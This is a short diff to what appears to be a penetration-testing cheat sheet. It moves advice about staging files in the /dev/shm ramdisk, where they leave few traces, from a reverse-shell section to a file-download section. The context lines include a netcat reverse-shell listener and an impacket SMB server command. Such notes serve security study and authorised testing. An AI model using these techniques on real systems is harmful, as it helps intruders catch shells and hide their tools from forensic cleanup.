@@ -68,13 +68,6 @@ impacket-smbserver -smb2server share .
 
 <details><summary><input type=checkbox> reverse shells and port bindings</summary>
 
-* on Linux you should save your files to `/dev/shm` (the ramdisk)
-  * type `mount | grep shm` to see that it is a tmpfs filesystem
-  * it gets wiped on unmount (you could clean up with `umount /dev/shm`)
-  * other choices:
-    * `/tmp` gets wiped on reboot (might be tmpfs)
-    * `/var/tmp` persists between reboots (not tmpfs)
-
 ```sh
 # netcat
 rlwrap nc -lnvp 42424
@@ -112,6 +105,12 @@ locate / # list of probably every file on the system.
 
 <details><summary><input type=checkbox> downloading files</summary>
 
+* on Linux you should save your files to `/dev/shm` (the ramdisk)
+  * type `mount | grep shm` to see that it is a tmpfs filesystem
+  * it gets wiped on unmount (you could clean up with `umount /dev/shm`)
+  * other choices:
+    * `/tmp` gets wiped on reboot (might be tmpfs)
+    * `/var/tmp` persists between reboots (not tmpfs)
 
 ```sh
 # linux download:
